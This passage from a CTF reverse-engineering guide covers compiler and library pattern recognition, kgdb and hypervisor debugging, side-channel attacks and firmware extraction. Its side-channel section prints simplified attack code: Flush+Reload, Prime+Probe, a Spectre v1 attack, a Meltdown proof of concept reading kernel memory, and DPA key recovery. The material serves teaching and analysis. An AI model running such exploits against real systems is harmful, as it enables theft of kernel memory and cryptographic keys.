# Window → Decompiler → Higher-level representation shows for/while
```

### Induction Variable Analysis

**Primary Induction Variable**

- Variable incremented/decremented by constant each iteration
- Typically loop counter

**Derived Induction Variables**

- Variables computed from primary induction variable
- Example: `array[i]` where `i` is primary IV

```python
# Manual identification in disassembly
# 1. Find variables modified in loop
# 2. Check if modification is constant per iteration
# 3. Identify relationships: derived = a * primary + b
```

### Loop Optimization Pattern Recognition

**Loop Unrolling**

```nasm
; Original loop might be unrolled to:
    ; iteration 0
    mov eax, [esi]
    add eax, [edi]
    ; iteration 1
    mov eax, [esi+4]
    add eax, [edi+4]
    ; iteration 2
    mov eax, [esi+8]
    add eax, [edi+8]
    ; ...
```

**Loop Vectorization (SIMD)**

```nasm
; AVX/SSE instructions in loop body
vmovdqa ymm0, [rsi]        ; Load 256 bits
vpaddd ymm0, ymm0, [rdi]   ; SIMD addition
vmovdqa [rdx], ymm0        ; Store result
```

Recognition pattern: multiple elements processed per iteration using vector instructions

**Strength Reduction**

```nasm
; Multiplication replaced with addition
; Original: array[i * 4]
; Optimized: 
    mov eax, 0          ; offset = 0
.loop:
    mov ebx, [array + eax]
    add eax, 4          ; offset += 4 instead of i*4
```

## Recognizing Compiler-Generated Code

### Compiler Signature Patterns

**Stack Frame Setup by Compiler**

**GCC**

```nasm
push rbp
mov rbp, rsp
sub rsp, 0xNN          ; Allocate locals
```

**Clang**

```nasm
push rbp
mov rbp, rsp
sub rsp, 0xNN
; Often similar to GCC
```

**MSVC (Microsoft Visual C++)**

```nasm
push ebp
mov ebp, esp
sub esp, 0xNN
push ebx
push esi
push edi               ; Save callee-saved registers
```

**Detection Method**

```bash
# Check compiler info
strings binary | grep -i "gcc\|clang\|msvc"
rabin2 -I binary | grep compiler

# Check for compiler-specific library calls
nm binary | grep __
# GCC: __stack_chk_fail, __libc_start_main
# MSVC: __security_init_cookie, _CxxThrowException
```

### Optimization Level Recognition

**-O0 (No Optimization)**

- Verbose code with many redundant operations
- Variables frequently loaded/stored to memory
- Straightforward mapping to source code

```nasm
; Example: a = b + c;
mov eax, [rbp-4]   ; Load b
mov edx, [rbp-8]   ; Load c
add eax, edx
mov [rbp-12], eax  ; Store a
```

**-O1 (Basic Optimization)**

- Register allocation improves
- Dead code elimination
- Some constant folding

**-O2 (Moderate Optimization)**

- Function inlining begins
- Loop unrolling
- Instruction scheduling
- More aggressive register usage

```nasm
; Same operation optimized:
mov eax, [rbp-4]
add eax, [rbp-8]   ; Combined load and add
mov [rbp-12], eax
```

**-O3 (Aggressive Optimization)**

- Extensive function inlining
- Loop vectorization (SIMD)
- Aggressive loop unrolling
- Interprocedural optimizations

```nasm
; Vectorized loop
vmovdqu ymm0, [rsi+rax]
vpaddd ymm0, ymm0, [rdi+rax]
vmovdqu [rdx+rax], ymm0
```

**-Os (Size Optimization)**

- Function calls instead of inlining
- Minimal loop unrolling
- Compact instruction selection

### Security Features Recognition

**Stack Canaries**

```nasm
; GCC stack canary (SSP)
mov rax, qword [fs:0x28]   ; Load canary from TLS
mov [rbp-8], rax            ; Place on stack

; Before return
mov rax, [rbp-8]
xor rax, qword [fs:0x28]   ; Check canary
je .canary_ok
call __stack_chk_fail
.canary_ok:
```

**Detection**

```bash
checksec --file=binary
# Look for: Canary found

readelf -s binary | grep stack_chk
objdump -d binary | grep "fs:0x28"
```

**Position-Independent Executable (PIE)**

```nasm
; PIC code uses RIP-relative addressing
lea rax, [rip + 0x200d45]   ; Instead of absolute address
mov rax, qword [rax]
```

**Detection**

```bash
readelf -h binary | grep Type
# Type: DYN indicates PIE

rabin2 -I binary | grep pic
```

**RELRO (Relocation Read-Only)**

```bash
readelf -l binary | grep GNU_RELRO
# Partial RELRO: .got writable
# Full RELRO: .got.plt also read-only
```

**NX (No-Execute) / DEP**

```bash
readelf -l binary | grep GNU_STACK
# Flags: RW (NX enabled)
# Flags: RWE (NX disabled)
```

### Calling Convention Recognition

**cdecl (x86)**

```nasm
; Caller cleans stack
push arg3
push arg2
push arg1
call function
add esp, 12        ; Cleanup
```

**stdcall (x86 Windows)**

```nasm
; Callee cleans stack
push arg3
push arg2
push arg1
call function      ; Function does: ret 12
```

**fastcall (x86)**

```nasm
; First 2 args in ECX, EDX
mov ecx, arg1
mov edx, arg2
push arg3
call function
```

**System V AMD64 ABI (x86-64 Linux)**

```nasm
; Args in: RDI, RSI, RDX, RCX, R8, R9, then stack
mov rdi, arg1
mov rsi, arg2
call function
```

**Microsoft x64 (Windows)**

```nasm
; Args in: RCX, RDX, R8, R9, then stack
; Shadow space (32 bytes) always allocated
sub rsp, 32        ; Shadow space
mov rcx, arg1
call function
add rsp, 32
```

**ARM**

```asm
; Args in R0-R3, rest on stack
mov r0, arg1
mov r1, arg2
bl function
```

### Identifying Prologue/Epilogue Variations

**Frame Pointer Omission (-fomit-frame-pointer)**

```nasm
; No RBP setup
sub rsp, 0xNN      ; Direct stack allocation
; Access locals via RSP offset
mov eax, [rsp+0x10]
```

**Leaf Function Optimization**

```nasm
; Functions that don't call others may skip frame setup
sub rsp, 8         ; Minimal alignment
mov eax, [rdi]
add rsp, 8
ret
```

**Tail Call Optimization**

```nasm
; No epilogue, direct jump
mov rdi, rsi
jmp another_function    ; Instead of call + ret
```

## Identifying Standard Library Functions

### String Function Recognition

**strcmp Pattern**

```nasm
; Typical strcmp loop
.loop:
    movzx eax, byte [rdi]
    movzx edx, byte [rsi]
    cmp al, dl
    jne .not_equal
    test al, al
    je .equal
    inc rdi
    inc rsi
    jmp .loop
```

**strcpy Pattern**

```nasm
.loop:
    mov al, byte [rsi]
    mov byte [rdi], al
    test al, al
    je .done
    inc rsi
    inc rdi
    jmp .loop
```

**strlen Pattern**

```nasm
    xor eax, eax
.loop:
    cmp byte [rdi + rax], 0
    je .done
    inc rax
    jmp .loop
.done:
    ret
```

**Modern Optimized Versions**

```nasm
; SSE-optimized strlen
pxor xmm0, xmm0
movdqa xmm1, [rdi]
pcmpeqb xmm1, xmm0     ; Compare 16 bytes at once
pmovmskb eax, xmm1     ; Get bitmask
test eax, eax
```

### Memory Function Recognition

**memcpy Pattern**

```nasm
; Simple byte copy
    mov rcx, rdx       ; size
.loop:
    mov al, [rsi]
    mov [rdi], al
    inc rsi
    inc rdi
    dec rcx
    jnz .loop

; Optimized with rep movsb
mov rcx, rdx
rep movsb

; SSE/AVX optimized
vmovdqu ymm0, [rsi]
vmovdqu [rdi], ymm0
```

**memset Pattern**

```nasm
; Simple version
    mov rcx, rdx       ; count
.loop:
    mov byte [rdi], sil
    inc rdi
    dec rcx
    jnz .loop

; Optimized
    mov rcx, rdx
    mov al, sil
    rep stosb
```

**memcmp Pattern**

```nasm
    mov rcx, rdx       ; size
.loop:
    mov al, [rdi]
    cmp al, [rsi]
    jne .not_equal
    inc rdi
    inc rsi
    dec rcx
    jnz .loop
    xor eax, eax       ; Equal
    ret
.not_equal:
    ; Return difference
```

### Mathematical Function Identification

**abs / fabs**

```nasm
; Integer abs
    mov eax, edi
    neg eax
    cmovl eax, edi

; Float fabs (clear sign bit)
    andps xmm0, [mask_7fffffff]  ; Clear MSB
```

**sqrt**

```nasm
sqrtsd xmm0, xmm0      ; Hardware sqrt
; Or call to __ieee754_sqrt
```

**Trigonometric Functions**

- Typically library calls: sin, cos, tan
- May use lookup tables + polynomial approximation
- [Inference] Modern implementations often in libm.so

```bash
# Identify math library calls
nm binary | grep " U " | grep -E "sin|cos|tan|exp|log"
```

### I/O Function Recognition

**printf Family**

```nasm
; Typical printf call
lea rdi, [rel format_string]  ; First arg: format
mov rsi, arg1                  ; Variable args
xor eax, eax                   ; No vector registers used
call printf@plt
```

Format string at referenced address contains `%` specifiers

**scanf Family**

```nasm
lea rdi, [rel format_string]
lea rsi, [rbp-8]               ; Address to store input
xor eax, eax
call scanf@plt
```

**fopen / fread / fwrite**

```nasm
; fopen
lea rdi, [rel filename]
lea rsi, [rel mode]      ; "r", "w", etc.
call fopen@plt

; fread
mov rdi, buffer          ; ptr
mov rsi, 1               ; size
mov rdx, count           ; nmemb
mov rcx, file_ptr        ; FILE*
call fread@plt
```

### Allocator Function Recognition

**malloc / free**

```nasm
; malloc
mov rdi, size
call malloc@plt
test rax, rax           ; Check NULL
je .alloc_failed

; free
mov rdi, ptr
call free@plt
```

**calloc**

```nasm
mov rdi, nmemb
mov rsi, size
call calloc@plt         ; Returns zero-initialized memory
```

**realloc**

```nasm
mov rdi, old_ptr
mov rsi, new_size
call realloc@plt
```

### Automated Library Function Detection

**FLIRT Signatures (IDA Pro)**

- Pattern matching for library functions
- File → Load File → FLIRT Signature File (.sig)
- Auto-applied during initial analysis

**Ghidra Function ID**

```
Analysis → Auto Analysis → Function ID
Window → Function ID → Configure libraries
```

**radare2 zignatures**

```bash
[0x00000000]> z         # Signatures menu
[0x00000000]> zo libc   # Load libc signatures
[0x00000000]> afl       # Re-list functions (now with names)
```

**Binary Ninja Signature Matcher**

- Settings → Plugin Manager → Install signature libraries
- Auto-detection during analysis

### Heuristic Identification

**Cross-Reference Analysis**

- Functions called from many locations likely utilities
- Functions never returning likely exit-related (exit, abort)

```bash
# radare2 xref analysis
[0x00000000]> afl
[0x00000000]> axt @ sym.suspected_lib_func
# Many callers = likely utility function
```

**Parameter Patterns**

- String pointer + format specifiers → printf-like
- Two pointers + size → memory operation
- File descriptor + buffer + size → read/write

**Return Value Patterns**

- Returns -1 on error, 0+ on success → POSIX functions
- Returns pointer (NULL on error) → allocation functions

---

## Important Related Topics for CTF Success

**Subtopics to explore next:**

- Anti-debugging and anti-analysis techniques detection
- Unpacking and deobfuscation strategies
- Dynamic analysis integration with static RE workflows
- Symbolic execution practical applications
- Intermediate representations (P-code, LLIL, MLIL, VEX)

---

# Special Techniques

## Kernel-Level Debugging (kgdb)

### kgdb Setup and Configuration

**Host-Target Architecture**

- **Target machine**: Runs kernel being debugged
- **Host machine**: Runs GDB, controls debugging session
- Connection via serial port, USB, or network

**Kernel Configuration Requirements**

```bash
# Required kernel config options
CONFIG_KGDB=y                    # Core kgdb support
CONFIG_KGDB_SERIAL_CONSOLE=y     # Serial console support
CONFIG_KGDB_KDB=y                # KDB frontend
CONFIG_DEBUG_INFO=y              # Debug symbols
CONFIG_FRAME_POINTER=y           # Stack traces
CONFIG_MAGIC_SYSRQ=y             # SysRq trigger
```

**Building Debug Kernel**

```bash
# Enable debug options in kernel config
make menuconfig
# Kernel hacking → Kernel debugging
# Kernel hacking → Compile-time checks and compiler options → Debug info

# Build kernel with debug symbols
make -j$(nproc)
make modules_install
make install

# Keep vmlinux (uncompressed with symbols) for host GDB
cp vmlinux /path/to/debug/
```

### Connection Methods

**Serial Connection (Traditional)**

Target machine boot parameters:

```bash
# Add to kernel command line (GRUB)
console=ttyS0,115200 kgdboc=ttyS0,115200 kgdbwait

# kgdboc: kgdb over console
# kgdbwait: wait for debugger on boot
```

Host machine connection:

```bash
# Start GDB with kernel symbols
gdb ./vmlinux

# Connect via serial
(gdb) set serial baud 115200
(gdb) target remote /dev/ttyS0
```

**Network Connection (kgdboe - Ethernet)**

Target machine setup:

```bash
# Load kgdboe module
modprobe kgdboe kgdboe=@target_ip/,@host_ip/

# Or kernel command line:
kgdboe=@192.168.1.100/,@192.168.1.10/

# Trigger kgdb via sysrq
echo g > /proc/sysrq-trigger
```

Host machine:

```bash
gdb ./vmlinux
(gdb) target remote udp:192.168.1.100:6443
```

**QEMU/KVM Virtual Machine**

```bash
# Launch QEMU with gdb stub
qemu-system-x86_64 -kernel vmlinuz \
    -initrd initrd.img \
    -s -S \
    -append "nokaslr"

# -s: gdbserver on tcp::1234
# -S: pause on startup

# Connect from host
gdb ./vmlinux
(gdb) target remote :1234
(gdb) c
```

### Triggering kgdb Entry

**SysRq Magic Keys**

```bash
# Via keyboard (if physical access)
Alt + SysRq + g

# Via /proc/sysrq-trigger
echo g > /proc/sysrq-trigger

# Via function call in kernel
kgdb_breakpoint();
```

**Kernel Panic Automatic Entry**

```bash
# Kernel command line
panic=0 kgdbcon

# panic=0: Wait forever on panic
# kgdbcon: Use kgdb on panic
```

**Software Breakpoint**

```c
// In kernel module or modified kernel code
#include <linux/kgdb.h>
kgdb_breakpoint();
```

### kgdb Commands and Workflow

**Basic GDB Commands for Kernel**

```bash
# List source (if available)
(gdb) list do_sys_open

# Set breakpoint
(gdb) b do_sys_open
(gdb) b *0xffffffff81234567  # By address

# Hardware breakpoints (limited, usually 4)
(gdb) hbreak some_function

# Watchpoints
(gdb) watch global_variable
(gdb) watch *(int*)0xffffffffc0001000

# Continue execution
(gdb) c

# Step through code
(gdb) si  # Step instruction
(gdb) ni  # Next instruction

# Examine registers
(gdb) info registers
(gdb) p $rip
(gdb) p $rdi

# Examine memory
(gdb) x/20gx $rsp
(gdb) x/s 0xffffffff81a00000

# Backtrace
(gdb) bt
(gdb) bt full  # With local variables

# Thread information (CPUs)
(gdb) info threads
(gdb) thread 2  # Switch to CPU 2
```

**Kernel-Specific Operations**

```bash
# Print kernel structures
(gdb) p *(struct task_struct *)0xffff888012345678
(gdb) p current  # Current task

# Follow linked lists
(gdb) p init_task.tasks.next
(gdb) p ((struct task_struct *)0xffff...)->comm

# Module debugging
(gdb) lx-symbols  # Load module symbols (requires scripts)
# Or manually:
(gdb) add-symbol-file module.ko 0xffffffffc0000000
```

**Python Scripts for Kernel Debugging**

```bash
# GDB comes with kernel helper scripts
(gdb) source scripts/gdb/vmlinux-gdb.py

# Available commands:
(gdb) lx-dmesg          # Print kernel log
(gdb) lx-lsmod          # List modules
(gdb) lx-symbols        # Load module symbols
(gdb) lx-ps             # List processes
(gdb) lx-cmdline        # Show boot command line
```

### KDB (Kernel Debugger) Frontend

**KDB vs kgdb**

- KDB: Built-in kernel debugger, simpler, console-based
- kgdb: Full GDB interface, more powerful
- Can switch between modes

**Entering KDB**

```bash
# Via SysRq
echo g > /proc/sysrq-trigger

# Via kgdb
(gdb) monitor kdb
```

**KDB Commands**

```
kdb> help
kdb> md 0xffffffff81000000 100  # Memory display
kdb> mm 0xffffffff81000000 0x90 # Memory modify
kdb> bp do_sys_open              # Set breakpoint
kdb> bc 0                        # Clear breakpoint 0
kdb> bt                          # Backtrace
kdb> bta                         # Backtrace all CPUs
kdb> ps                          # Process list
kdb> dmesg                       # Kernel messages
kdb> lsmod                       # List modules
kdb> go                          # Continue
kdb> ss                          # Single step
```

### Debugging Kernel Modules

**Module Loading with Symbols**

```bash
# On target: Load module
insmod mymodule.ko

# Find module load address
cat /sys/module/mymodule/sections/.text
# Returns: 0xffffffffc0002000

# On host GDB
(gdb) add-symbol-file mymodule.ko 0xffffffffc0002000

# Set breakpoints in module
(gdb) b mymodule_init
(gdb) c
```

**Automatic Module Symbol Loading**

```bash
# Using lx-symbols (Python script)
(gdb) source scripts/gdb/vmlinux-gdb.py
(gdb) lx-symbols /path/to/modules/

# Automatically loads symbols as modules load
```

### Common Kernel Debugging Scenarios

**Analyzing Kernel Crash**

```bash
# Connect after crash
(gdb) bt
# Examine crash location
(gdb) list
(gdb) info locals

# Check for common issues
(gdb) p $rip  # Instruction pointer
(gdb) p $rsp  # Stack pointer validity
(gdb) x/10gx $rsp  # Stack contents
```

**Debugging System Call**

```bash
# Break on system call entry
(gdb) b __x64_sys_open
(gdb) c

# Examine arguments
(gdb) p $rdi  # First argument (filename)
(gdb) x/s $rdi
```

**Race Condition Analysis**

```bash
# Use hardware breakpoints on shared data
(gdb) hbreak variable_write_function
(gdb) commands
>bt
>c
>end

# Monitor all CPUs
(gdb) info threads
(gdb) thread apply all bt
```

### Limitations and Considerations

**KASLR (Kernel Address Space Layout Randomization)**

- Randomizes kernel base address
- Disable for debugging: `nokaslr` in kernel command line
- Or find base dynamically:

```bash
# Read from /proc/kallsyms
sudo cat /proc/kallsyms | grep " _text"
```

**kgdb Cannot Debug**

- Very early boot code (before kgdb initialization)
- NMI handlers
- Some interrupt contexts
- [Inference] Code that disables interrupts for extended periods

**Performance Impact**

- Breakpoints can significantly slow system
- Watchpoints even more expensive
- Production systems should not run debug kernels

## Hypervisor-Level Analysis

### Hypervisor Types and Analysis Approaches

**Type 1 (Bare Metal): Xen, KVM, VMware ESXi**

- Runs directly on hardware
- Analyzes guest VM from privileged position

**Type 2 (Hosted): VirtualBox, VMware Workstation, QEMU**

- Runs as application on host OS
- Easier to instrument

### QEMU/KVM Debugging

**QEMU Monitor Commands**

```bash
# Launch QEMU with monitor
qemu-system-x86_64 -monitor stdio -enable-kvm ...

# Or via telnet
qemu-system-x86_64 -monitor telnet:127.0.0.1:4444,server,nowait ...
telnet localhost 4444

# Monitor commands
(qemu) info registers        # Guest CPU registers
(qemu) info mem              # Guest memory mapping
(qemu) info tlb              # TLB entries
(qemu) info mtree            # Memory tree
(qemu) x /20gx 0x7fff0000    # Examine guest memory
(qemu) xp /20gx 0x40000000   # Examine physical memory
(qemu) info snapshots        # List VM snapshots
(qemu) savevm snapshot1      # Create snapshot
(qemu) loadvm snapshot1      # Restore snapshot
(qemu) gdbserver tcp::1234   # Start GDB server
```

**QEMU GDB Integration**

```bash
# Launch QEMU with GDB stub
qemu-system-x86_64 -s -S -kernel vmlinuz ...

# Connect GDB
gdb
(gdb) target remote :1234
(gdb) set architecture i386:x86-64
(gdb) b *0x7c00  # Break at boot sector

# Debugging guest kernel
gdb vmlinux
(gdb) target remote :1234
(gdb) c
```

**Memory Forensics via QEMU**

```bash
# Dump guest physical memory
(qemu) pmemsave 0 4G memory.dump

# Or via command line
qemu-system-x86_64 -m 4G \
    -monitor stdio \
    -drive file=disk.img \
    ...
(qemu) dump-guest-memory memory.elf
```

### Volatility Framework Integration

**Analyzing VM Memory Dumps**

```bash
# Dump memory from running VM
virsh qemu-monitor-command vm_name --hmp "dump-guest-memory memory.img"

# Analyze with Volatility
volatility -f memory.img imageinfo
volatility -f memory.img --profile=LinuxUbuntu2004x64 linux_pslist
volatility -f memory.img --profile=LinuxUbuntu2004x64 linux_bash

# Kernel structure analysis
volatility -f memory.img --profile=... linux_lsmod
volatility -f memory.img --profile=... linux_hidden_modules
```

### Virtual Machine Introspection (VMI)

**LibVMI Framework**

```bash
# Install LibVMI
git clone https://github.com/libvmi/libvmi
cd libvmi
./autogen.sh
./configure
make && sudo make install

# Example: Read process list
vmi-process-list vm_name

# Python API usage
```

```python
import libvmi

# Initialize VMI
vmi = libvmi.Libvmi("vm_name")

# Read memory
data = vmi.read_pa(0x1000, 4096)  # Physical address
data = vmi.read_va(0x7fffffffe000, 4096, 0)  # Virtual address, PID

# Translate addresses
paddr = vmi.translate_kv2p(vaddr)  # Kernel virtual to physical
paddr = vmi.translate_uv2p(vaddr, pid)  # User virtual to physical

# Process introspection
processes = vmi.get_process_list()
for proc in processes:
    print(f"PID: {proc['pid']}, Name: {proc['name']}")
```

**Drakvuf Dynamic Analysis**

```bash
# Install Drakvuf (requires Xen)
git clone https://github.com/tklengyel/drakvuf
cd drakvuf
./configure
make && sudo make install

# System call tracing
drakvuf --domain vm_name -r /path/to/rekall/profile.json -a syscall

# File tracing
drakvuf --domain vm_name -r profile.json -a filedelete -a filetracer

# API call monitoring
drakvuf --domain vm_name -r profile.json -a apimon
```

### Hardware-Assisted Virtualization Analysis

**Intel VT-x / AMD-V Extended Page Tables (EPT/NPT)**

**EPT Violation Monitoring**

- Hypervisor can set page permissions in EPT
- Access triggers VM exit
- Useful for monitoring specific memory regions

[Inference] Custom hypervisor modification required for EPT-based monitoring

**Example Concept (requires hypervisor modification)**

```c
// Pseudocode for EPT-based memory monitoring
void setup_ept_monitoring(uint64_t gpa) {
    ept_entry_t *entry = get_ept_entry(gpa);
    entry->read = 0;   // Trigger on read
    entry->write = 0;  // Trigger on write
    entry->execute = 1; // Allow execution
}

void handle_ept_violation(vmx_exit_info_t *exit_info) {
    uint64_t gpa = exit_info->guest_physical_address;
    uint64_t gva = exit_info->guest_linear_address;
    
    // Log access
    log_memory_access(gpa, gva, exit_info->access_type);
    
    // Emulate or single-step
    if (should_emulate) {
        emulate_instruction(exit_info);
    }
}
```

### Hypervisor Escape Detection

**Monitoring for Escape Attempts**

**VM Exit Frequency Analysis**

```bash
# QEMU statistics
(qemu) info stats
(qemu) info jit

# Monitor excessive VM exits (potential exploit)
```

**Hypercall Fuzzing Detection**

```c
// Monitor for malformed hypercalls
void monitor_hypercall(int hypercall_num, uint64_t *args) {
    if (hypercall_num > MAX_HYPERCALL) {
        log_suspicious_activity("Invalid hypercall", hypercall_num);
        return;
    }
    
    // Validate arguments
    for (int i = 0; i < hypercall_arg_count[hypercall_num]; i++) {
        if (!is_valid_guest_address(args[i])) {
            log_suspicious_activity("Invalid hypercall arg", args[i]);
        }
    }
}
```

### Nested Virtualization Analysis

**Running Hypervisor Inside VM**

```bash
# Enable nested virtualization (Intel)
sudo modprobe -r kvm_intel
sudo modprobe kvm_intel nested=1

# Verify
cat /sys/module/kvm_intel/parameters/nested

# Launch L1 guest with nested support
qemu-system-x86_64 -cpu host,+vmx -enable-kvm ...
```

**Analyzing Nested VM Behavior**

- L0: Host hypervisor
- L1: Guest hypervisor
- L2: Nested guest

[Inference] Useful for analyzing hypervisor-aware malware or rootkits

## Side-Channel Analysis Basics

### Timing Attacks

**Cache Timing Attack Principles**

- Cache hits are faster than cache misses
- Attacker can infer accessed memory addresses
- Applicable to cryptographic implementations

**Flush+Reload Attack**

```c
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

#define CACHE_LINE_SIZE 64

// Flush cache line
void flush(void *addr) {
    _mm_clflush(addr);
}

// Measure access time
uint64_t time_access(void *addr) {
    uint64_t start, end;
    volatile char temp;
    
    start = __rdtscp();
    temp = *(char *)addr;
    end = __rdtscp();
    
    return end - start;
}

// Flush+Reload attack
void flush_reload(void *probe_addr) {
    uint64_t time;
    
    // Flush target from cache
    flush(probe_addr);
    _mm_mfence();
    
    // Wait for victim to access
    usleep(1000);
    
    // Reload and time
    time = time_access(probe_addr);
    
    if (time < THRESHOLD) {
        printf("Cache hit - victim accessed address\n");
    } else {
        printf("Cache miss - victim did not access\n");
    }
}
```

**Prime+Probe Attack**

```c
#define CACHE_WAYS 16
#define CACHE_SETS 64

uint8_t eviction_set[CACHE_WAYS][CACHE_LINE_SIZE] __attribute__((aligned(4096)));

// Fill cache set
void prime_cache_set(int set) {
    for (int way = 0; way < CACHE_WAYS; way++) {
        volatile uint8_t temp = eviction_set[way][set * CACHE_LINE_SIZE];
    }
}

// Measure cache set access time
uint64_t probe_cache_set(int set) {
    uint64_t start, end;
    
    start = __rdtscp();
    for (int way = 0; way < CACHE_WAYS; way++) {
        volatile uint8_t temp = eviction_set[way][set * CACHE_LINE_SIZE];
    }
    end = __rdtscp();
    
    return end - start;
}

// Prime+Probe attack
void prime_probe_attack(void) {
    uint64_t baseline_time, probe_time;
    
    // Establish baseline
    prime_cache_set(0);
    baseline_time = probe_cache_set(0);
    
    // Wait for victim
    usleep(1000);
    
    // Probe
    probe_time = probe_cache_set(0);
    
    if (probe_time > baseline_time * 1.5) {
        printf("Victim accessed this cache set\n");
    }
}
```

**Threshold Calibration**

```c
#define SAMPLES 1000

uint64_t calibrate_threshold(void) {
    uint64_t hit_times[SAMPLES], miss_times[SAMPLES];
    void *addr = malloc(4096);
    
    // Measure cache hits
    for (int i = 0; i < SAMPLES; i++) {
        _mm_clflush(addr);
        _mm_mfence();
        *(volatile char *)addr;  // Load into cache
        hit_times[i] = time_access(addr);
    }
    
    // Measure cache misses
    for (int i = 0; i < SAMPLES; i++) {
        _mm_clflush(addr);
        _mm_mfence();
        miss_times[i] = time_access(addr);
    }
    
    // Calculate median threshold
    uint64_t hit_median = median(hit_times, SAMPLES);
    uint64_t miss_median = median(miss_times, SAMPLES);
    
    return (hit_median + miss_median) / 2;
}
```

### Spectre/Meltdown Exploitation Basics

**Spectre Variant 1: Bounds Check Bypass**

```c
// Vulnerable code pattern
uint8_t array1[16];
uint8_t array2[256 * 4096];  // Probe array

size_t array1_size = 16;

uint8_t victim_function(size_t x) {
    if (x < array1_size) {  // Bounds check
        // Speculatively executed even when x >= array1_size
        return array2[array1[x] * 4096];
    }
    return 0;
}

// Attack code
void spectre_v1_attack(size_t malicious_x) {
    uint8_t dummy = 0;
    
    // Train branch predictor
    for (int i = 0; i < 30; i++) {
        _mm_clflush(&array1_size);
        victim_function(i % array1_size);
    }
    
    // Flush probe array
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&array2[i * 4096]);
    }
    _mm_mfence();
    
    // Exploit: access out-of-bounds
    // array1_size is not in cache, bounds check mispredicted
    _mm_clflush(&array1_size);
    for (int i = 0; i < 100; i++) {}  // Delay
    
    dummy = victim_function(malicious_x);  // Speculative execution
    
    // Probe which cache line was loaded
    for (int i = 0; i < 256; i++) {
        uint64_t time = time_access(&array2[i * 4096]);
        if (time < THRESHOLD) {
            printf("Leaked byte value: %d\n", i);
        }
    }
}
```

**Meltdown (Rogue Data Cache Load)**

```c
// Simplified Meltdown proof-of-concept
void meltdown_attack(void *kernel_addr) {
    uint8_t probe_array[256 * 4096];
    uint8_t dummy = 0;
    
    // Flush probe array
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&probe_array[i * 4096]);
    }
    _mm_mfence();
    
    // Suppress exception (e.g., TSX or signal handler)
    // Here simplified without actual exception suppression
    
    try_read:
    // Speculatively read kernel memory
    dummy = *(volatile uint8_t *)kernel_addr;
    
    // Encode in cache (speculative)
    dummy = probe_array[dummy * 4096];
    
    // Probe for cached line
    for (int i = 0; i < 256; i++) {
        uint64_t time = time_access(&probe_array[i * 4096]);
        if (time < THRESHOLD) {
            printf("Kernel byte value: 0x%02x\n", i);
        }
    }
}
```

[Unverified] Modern CPUs have mitigations (KPTI, retpoline, etc.) that reduce effectiveness

### Power Analysis Attacks (Basics)

**Simple Power Analysis (SPA)**

- Directly observe power traces
- Identify operations from power consumption patterns

**Differential Power Analysis (DPA)**

- Statistical analysis of multiple power traces
- Correlate power consumption with intermediate crypto values

**Conceptual DPA Process**

1. Collect power traces during crypto operation
2. Hypothesize key values
3. Compute intermediate values for each hypothesis
4. Correlate power consumption with hypothesized values
5. Correct key hypothesis shows highest correlation

[Unverified] Requires hardware setup with oscilloscope or specialized equipment

**Simulated Power Trace Analysis (Software)**

```python
import numpy as np

def hamming_weight(n):
    """Count set bits"""
    return bin(n).count('1')

def dpa_attack(traces, plaintexts, target_byte):
    """
    Simplified DPA attack on AES S-box output
    traces: Power consumption traces (N x time_samples)
    plaintexts: Known plaintexts (N x 16)
    target_byte: Which byte to attack (0-15)
    """
    num_traces = len(traces)
    key_guess_scores = []
    
    # Try all 256 key guesses
    for key_guess in range(256):
        # Compute hypothetical intermediate value
        intermediate_values = []
        for plaintext in plaintexts:
            sbox_input = plaintext[target_byte] ^ key_guess
            sbox_output = aes_sbox[sbox_input]
            intermediate_values.append(hamming_weight(sbox_output))
        
        # Correlate with power traces
        correlation = np.corrcoef(intermediate_values, traces.mean(axis=1))[0, 1]
        key_guess_scores.append(abs(correlation))
    
    # Highest correlation = likely correct key
    return np.argmax(key_guess_scores)
```

### Electromagnetic Analysis

**EM Side-Channel Concept**

- Electronic devices emit EM radiation
- Radiation correlates with internal operations
- Can be measured with EM probes

**Basic EM Attack Setup** [Unverified] Requires specialized equipment:

- Near-field EM probe
- High-bandwidth oscilloscope
- Signal processing software

Similar analysis techniques to power analysis (SPA/DPA)

### Acoustic Cryptanalysis

**Keystroke Acoustics**

- Different keys produce different sounds
- Machine learning can classify keystrokes

**CPU Acoustic Leakage** [Speculation] Some research suggests CPU operations produce acoustic signatures

- Requires sensitive microphone
- Difficult to exploit practically

### Covert Channel Analysis

**Cache-Based Covert Channels**

```c
// Sender process
void send_bit(int bit) {
    if (bit == 1) {
        // Access shared memory to load in cache
        volatile char temp = *(char *)shared_addr;
    } else {
        // Don't access (leave out of cache)
        _mm_clflush(shared_addr);
    }
}

// Receiver process
int receive_bit(void) {
    uint64_t time = time_access(shared_addr);
    
    if (time < THRESHOLD) {
        return 1;  // Cache hit = bit 1
    } else {
        return 0;  // Cache miss = bit 0
    }
}
```

**Detecting Covert Channels**

- Monitor for unusual cache access patterns
- Analyze timing correlations between processes
- [Inference] Hardware performance counters can help detect

```bash
# Monitor cache misses with perf
perf stat -e cache-misses,cache-references ./suspicious_program
```

## Firmware Extraction and Analysis

### Firmware Extraction Methods

**Direct Physical Extraction**

**SPI Flash Reading (Common for Router/IoT)**

```bash
# Using Flashrom
sudo flashrom -p <programmer> -r firmware.bin

# Common programmers:
# -p ch341a_spi
# -p linux_spi:dev=/dev/spidev0.0
# -p ft2232_spi:type=2232H

# Identify chip
sudo flashrom -p ch341a_spi

# Read firmware
sudo flashrom -p ch341a_spi -r firmware_dump.bin -V
```

**JTAG/SWD Extraction**

```bash
# Using OpenOCD
openocd -f interface/stlink.cfg -f target/stm32f4x.cfg

# In OpenOCD console
> init
> reset halt
> flash read_bank 0 firmware.bin 0 0x80000
> shutdown

# Or via GDB server
openocd -f interface/jlink.cfg -f target/stm32f4x.cfg
gdb-multiarch
(gdb) target remote :3333
(gdb) dump binary memory firmware.bin 0x08000000 0x08080000
```

**UART/Serial Bootloader**

```bash
# Many devices have bootloader accessible via UART
# Common baud rates: 115200, 57600, 38400, 9600

screen /dev/ttyUSB0 115200
# Or
minicom -D /dev/ttyUSB0 -b 115200

# Interrupt boot sequence (often press key during boot)
# Common commands:
md <address> <length>  # Memory display
cp.b <src> <dst> <len> # Copy memory
```

**eMMC/NAND Flash Dumping**

```bash
# Using specialized hardware (e.g., Easy JTAG, Medusa Pro)
# Or via bootloader if accessible

# Linux devices with eMMC
dd if=/dev/mmcblk0 of=emmc_dump.img bs=4M

# NAND via MTD
cat /dev/mtd0 > nand_dump.img
```

